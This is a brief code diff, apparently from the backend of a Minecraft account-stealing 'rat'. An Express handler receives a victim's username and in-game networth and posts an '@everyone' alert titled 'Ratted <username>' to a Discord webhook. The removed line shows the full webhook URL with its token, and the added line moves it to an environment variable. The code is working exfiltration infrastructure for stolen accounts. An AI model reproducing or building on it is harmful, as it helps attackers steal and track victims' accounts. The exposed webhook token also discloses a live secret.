@@ -164,7 +164,7 @@ app.post("/", (req, res) => {
                 
                     sentnetworth = (Math.trunc(result[0])) / 1000000;
                     
-                    post("https://discord.com/api/webhooks/1037632110233653288/r4z6zfMmIbksaVdw_2Wu9yiMn5dlaudyBa4yoiomRL5aY6rShFghZ3vh5rCd3u6IZsBx", JSON.stringify({
+                    post(process.env.WEBHOOK, JSON.stringify({
                         content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
